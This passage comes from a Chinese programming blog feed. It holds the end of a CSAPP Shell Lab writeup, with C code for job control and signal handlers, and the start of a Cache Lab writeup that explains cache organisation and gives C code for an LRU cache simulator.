<p>pid跟jid的管理我们不用操心，已经写好了，我们只需要调用<code>addjob</code>跟<code>deletejob</code>这样的API来维护进程。</p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];</span><br><span class="line">    <span class="keyword">int</span> bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> builtin = builtin_cmd(argv);</span><br><span class="line">    <span class="keyword">if</span> (builtin) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* from now on, execute non-builtin command */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev_mask, mask_all;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    </span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask); <span class="comment">// block SIGCHLD</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork(); <span class="comment">// during fork, SIGCHLD is blocked</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child process</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">// unblock SIGCHLD</span></span><br><span class="line">        setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// make sure programs are not in the same group as tsh</span></span><br><span class="line">        <span class="comment">// must unblock signals before execve</span></span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent process</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">// block all signals</span></span><br><span class="line">        addjob(jobs, pid, bg + <span class="number">1</span>, cmdline); <span class="comment">// during addjob, all signals are blocked</span></span><br><span class="line">        <span class="keyword">if</span> (bg) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">// reset</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a><code>builtin_cmd</code></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a><code>do_bgfg</code></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such process\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    kill(-(job-&gt;pid), SIGCONT); <span class="comment">// send SIGCONT to the group, therefore negative</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a><code>waitfg</code></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;now in waitfg\n&quot;);</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sigsuspend(&amp;mask);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="signal-handlers"><a href="#signal-handlers" class="headerlink" title="signal handlers"></a>signal handlers</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGCHLD handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">    sigfillset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            <span class="comment">// normally exited</span></span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="comment">// exited via signal</span></span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) Terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// stopped</span></span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) Stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGINT handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, sig);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGTSTP handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, sig);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>最后实现的就是可以一个可以跑绝对路径的shell，支持前后台运行以及信号级别的进程交互。</p>
<p>最后发现<code>tshref</code>也连vim都打不开，我就平衡了（</p>
]]></content>
  </entry>
  <entry>
    <title>CSAPP Cache Lab Writeup</title>
    <url>/2021/07/15/CSAPP-Cache-Lab-Writeup/</url>
    <content><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="Cache知识点概述"><a href="#Cache知识点概述" class="headerlink" title="Cache知识点概述"></a>Cache知识点概述</h2><p>一般来说，cache就是这样的结构：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Cache-Lab-Writeup/organization-of-cache.png">
<blockquote>
<p>来自CSAPP 3e Figure 6.25</p>
</blockquote>
<a id="more"></a>
<p>首先看(a)图，这么一个cache里面有着$S=2^s$个set，每个set里面又有$E$个line，而每一个line就是cache里面的基本组成单位。</p>
<p>一个line由三部分组成：</p>
<ul>
<li>$B=2^b$个byte用来存缓存下来的内容</li>
<li>$t$个bit用来记录当前line的tag</li>
<li>$1$个bit用来表示当前line是valid的还是invalid的</li>
</ul>
<p>可见，cache能存储内容的量并不等同于实际所占的大小，它的size为$S \times E \times B$ bytes。</p>
<p>cache这样的结构就支持了用一个$m$位的地址去定位访问cache，如图(b)。当已知cache的地址，我们可以尝试从cache里面访问内容，流程如下：</p>
<ol>
<li>通过set index确定所在的set。</li>
<li>找出tag与之相等的line。</li>
<li>断言valid位不为0。</li>
<li>block offset代表starting byte，retrieve从这个byte开始的内容。</li>
</ol>
<p>当一次访问值的操作中恰好可以从cache里面找到而不用下放到访问内存，那么称为一次hit。当在cache里面找不到，称为一次miss。</p>
<p>在cache里面找不到值的miss发生时，这个值会被添加进cache当中，如果必须把某个cache line覆盖掉，那么这个过程称为eviction。</p>
<p>在评估缓存友好度的时候，一般我们看miss rate，miss发生得越多，miss penalty所占总时间就越多，运行速度就较慢。miss penalty的要比hit大两个数量级左右。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Cache-Lab-Writeup/miss-rate.png">
<p>要做到缓存友好，我们需要贯彻temporal locality（时间局部性）和spatial locality（空间局部性），比如步长为1的访问数组有很强的spatial locality，经常访问一个变量且尽量减少被evict的可能性有较好的temporal locality。</p>
<h2 id="做前必看"><a href="#做前必看" class="headerlink" title="做前必看"></a>做前必看</h2><p>做之前先看看<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">实验指导</a>，大体思路都在里面。</p>
<p>然后再了解一下<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">blocking</a>的知识，这个方法会在Part B中用到。</p>
<h2 id="Part-A-Building-Cache-Simulator"><a href="#Part-A-Building-Cache-Simulator" class="headerlink" title="Part A: Building Cache Simulator"></a>Part A: Building Cache Simulator</h2><p>Part A比较简单，需要你去模拟一个简化版的cache。</p>
<p>简化版代表不需要考虑b位的储存内容，eviction的策略选择Least Recently Used(LRU)原则，把最不常访问的元素顶替掉。</p>
<p>只需要修改<code>csim.c</code>，最终输出hit、miss跟eviction的次数。</p>
<p>具体思路recitation都有，直接贴代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> verbose; <span class="comment">// 0 means disable, 1 means enable</span></span><br><span class="line"><span class="keyword">int</span> s; <span class="comment">// number of set index bits</span></span><br><span class="line"><span class="keyword">int</span> S; <span class="comment">// number of sets</span></span><br><span class="line"><span class="keyword">int</span> E; <span class="comment">// associativity</span></span><br><span class="line"><span class="keyword">int</span> b; <span class="comment">// number of block bits</span></span><br><span class="line"><span class="keyword">char</span> traceFile[<span class="number">105</span>]; <span class="comment">// name of the `valgrind` trace to replay</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hit, miss, eviction; <span class="comment">// final answers</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsageInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -h: Optional help flag that prints usage info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -v: Optional verbose flag that displays trace info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -s &lt;s&gt;: Number of set index bits (S = 2s is the number of sets)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -E &lt;E&gt;: Associativity (number of lines per set)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -b &lt;b&gt;: Number of block bits (B = 2b is the block size)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -t &lt;tracefile&gt;: Name of the valgrind trace to replay\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseArguments</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                printUsageInfo();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                verbose = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                S = (<span class="number">1</span> &lt;&lt; s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">strncpy</span>(traceFile, optarg, <span class="number">105</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Unknown format. Please make sure it is valid.\n&quot;</span>);</span><br><span class="line">                printUsageInfo();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125; CacheLine;</span><br><span class="line"></span><br><span class="line">CacheLine **cacheTable;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildCache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// CacheLine **cacheTable;</span></span><br><span class="line">    cacheTable = <span class="built_in">malloc</span>(S * <span class="keyword">sizeof</span>(CacheLine*));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        cacheTable[i] = <span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; ++j) &#123;</span><br><span class="line">            cacheTable[i][j].valid = <span class="number">0</span>;</span><br><span class="line">            cacheTable[i][j].tag = <span class="number">0xffffffff</span>; <span class="comment">// initially an impossible value</span></span><br><span class="line">            cacheTable[i][j].timestamp = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cacheTable[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cacheTable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timeAdvance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cacheTable[i][j].valid) &#123;</span><br><span class="line">                cacheTable[i][j].timestamp++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> s_bits = ((addr &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> t_bits = (addr &gt;&gt; (s + b));</span><br><span class="line">    <span class="comment">// printf(&quot;[debug] t_bits = %u\n&quot;, t_bits);</span></span><br><span class="line">    <span class="comment">// if the corresponding cache can be found</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        CacheLine *cacheLine = &amp;cacheTable[s_bits][i];</span><br><span class="line">        <span class="comment">// printf(&quot;[debug] tag = %u\n&quot;, cacheLine-&gt;tag);</span></span><br><span class="line">        <span class="keyword">if</span> (cacheLine-&gt;tag == t_bits) &#123;</span><br><span class="line">            hit++;</span><br><span class="line">            cacheLine-&gt;timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;hit&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if we can fill the cache into a null cache line</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        CacheLine *cacheLine = &amp;cacheTable[s_bits][i];</span><br><span class="line">        <span class="comment">// printf(&quot;[debug] %u\n&quot;, cacheLine.tag);</span></span><br><span class="line">        <span class="keyword">if</span> (!cacheLine-&gt;valid) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[debug] fill in invalid\n&quot;);</span></span><br><span class="line">            cacheLine-&gt;valid = <span class="number">1</span>;</span><br><span class="line">            cacheLine-&gt;timestamp = <span class="number">0</span>;</span><br><span class="line">            cacheLine-&gt;tag = t_bits;</span><br><span class="line">            miss++;</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;miss&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// otherwise, find the target to be substituted according to LRU</span></span><br><span class="line">    <span class="comment">// LRU: Least Recently Used, due to the inverse of locality</span></span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>, max_time_interval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> time_diff = cacheTable[s_bits][i].timestamp;</span><br><span class="line">        <span class="keyword">if</span> (time_diff &gt; max_time_interval) &#123;</span><br><span class="line">            max_time_interval = time_diff;</span><br><span class="line">            idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    eviction++;</span><br><span class="line">    miss++;</span><br><span class="line">    cacheTable[s_bits][idx].tag = t_bits;</span><br><span class="line">    cacheTable[s_bits][idx].timestamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;miss eviction&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span> op, <span class="keyword">unsigned</span> <span class="keyword">int</span> addr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;%c %x,%d &quot;</span>, op, addr, size);</span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: <span class="comment">// load</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: <span class="comment">// store</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="comment">// load + store</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>: <span class="comment">// instruction load, ignored</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readTraceFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *file = fopen(traceFile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exception: cannot find tracefile.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 